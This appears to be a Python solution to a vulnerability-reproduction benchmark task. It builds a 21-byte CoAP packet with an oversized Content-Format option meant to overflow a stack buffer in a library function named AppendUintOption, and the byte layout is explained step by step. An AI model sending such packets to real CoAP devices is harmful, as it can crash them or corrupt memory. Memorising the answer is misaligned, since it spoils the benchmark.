import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC for the Stack Buffer Overflow in AppendUintOption.
        The vulnerability typically occurs when a CoAP packet contains a Uint option
        (like Content-Format, Option 12) with a length larger than expected (e.g., > 8 bytes),
        causing a stack buffer overflow when the library attempts to process or re-serialize it.
        
        Ground-truth PoC length is 21 bytes.
        """
        
        # CoAP Header (4 bytes)
        # Ver: 1 (2 bits), T: 0 (CON, 2 bits), TKL: 0 (4 bits) -> 0x40
        # Code: 0.01 (GET) -> 0x01
        # Message ID: 0x1234 (2 bytes)
        header = b'\x40\x01\x12\x34'
        
        # Option: Content-Format (Option Number 12)
        # Content-Format is a Uint option. We construct it with a length of 15 bytes
        # to trigger the overflow in AppendUintOption which likely uses a small stack buffer.
        
        # Option Byte calculation:
        # Delta = 12 (since it's the first option). 12 = 0xC.
        # Length = 15. We use the extended length notation for lengths >= 13.
        # Nibble 13 (0xD) indicates an 8-bit extended length follows.
        # Option Byte = (Delta << 4) | Length_Nibble = 0xCD.
        opt_byte = b'\xCD'
        
        # Extended Length Byte:
        # Value = Length - 13 => 15 - 13 = 2.
        ext_len = b'\x02'
        
        # Option Value (15 bytes)
        # Arbitrary data to fill the buffer and overflow.
        value = b'A' * 15
        
        # Total length: 4 (Header) + 1 (OptByte) + 1 (ExtLen) + 15 (Value) = 21 bytes
        return header + opt_byte + ext_len + value